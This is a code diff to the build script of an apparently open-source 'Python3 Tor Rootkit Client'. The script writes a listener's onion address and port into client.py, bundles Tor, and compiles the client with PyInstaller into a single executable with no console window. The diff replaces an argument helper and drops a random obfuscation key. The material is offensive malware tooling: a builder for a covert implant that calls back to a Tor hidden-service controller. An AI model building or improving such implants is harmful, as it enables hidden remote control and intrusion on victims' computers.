@@ -2,9 +2,7 @@ import PyInstaller.__main__
 import requests
 import os
 import zipfile
-import commandLineArgs
-import random
-import string
+from argparse import ArgumentParser
 
 
 def getTorExpertBundle():
@@ -30,8 +28,17 @@ def getTorExpertBundle():
 	os.chdir('..')
 
 
+
+def parse_args():
+	parser = ArgumentParser(description='Python3 Tor Rootkit Client')
+	parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
+	parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
+	args = parser.parse_args()
+	return args.onion, args.port
+
+
 if __name__ == '__main__':
-	onion, port = commandLineArgs.parse()
+	onion, port = parse_args()
 	# replace the onion and port line in client.py,
 	# since if havent found a more elegant way to do this yet.
 	lines = open('client.py').read().splitlines()
@@ -44,15 +51,10 @@ if __name__ == '__main__':
 	# dont download everytime
 	if not os.path.isdir('torbundle'):
 		getTorExpertBundle()
-	
-	# generate "random" obfuscation key
-	charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
-	obfusc_key = ''.join([random.choice(charset) for _ in range(20)])
 
 	PyInstaller.__main__.run([
 	    'client.py',
 	    '--onefile',
 	    '--noconsole',
-	    '--key={}'.format(obfusc_key),
 	    '--add-data=torbundle;torbundle'
 	])
